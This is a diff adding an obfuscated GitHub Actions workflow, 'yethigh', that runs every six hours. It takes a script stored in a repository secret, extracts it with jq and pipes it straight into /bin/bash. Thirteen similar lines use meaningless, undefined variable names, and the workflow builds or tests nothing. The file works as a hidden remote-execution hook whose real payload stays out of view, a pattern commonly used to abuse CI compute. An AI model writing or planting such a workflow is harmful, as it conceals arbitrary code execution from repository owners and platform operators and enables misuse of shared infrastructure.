@@ -1,0 +1,32 @@
+name: yethigh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yethigh
+        env:
+          c62860: ${{ secrets.c62860 }}
+        run: |
+          echo $c62860 | jq -r .rb6 | /bin/bash
+          echo $tk77 | jq -r .kcx3 | /bin/bash
+          echo $xa7 | jq -r .zaukn3549 | /bin/bash
+          echo $efb87 | jq -r .csuqd914 | /bin/bash
+          echo $i643 | jq -r .zqot7 | /bin/bash
+          echo $hy7917 | jq -r .audy5093 | /bin/bash
+          echo $ltzg3908 | jq -r .fak398 | /bin/bash
+          echo $csobs0693 | jq -r .a1782 | /bin/bash
+          echo $o96146 | jq -r .svw4 | /bin/bash
+          echo $coy189 | jq -r .dxe62 | /bin/bash
+          echo $wtecu29445 | jq -r .uh6 | /bin/bash
+          echo $c7807 | jq -r .dlhp8208 | /bin/bash
+          echo $ulh5185 | jq -r .yfi56 | /bin/bash
+          echo $lh9967 | jq -r .zrbfq83760 | /bin/bash
+
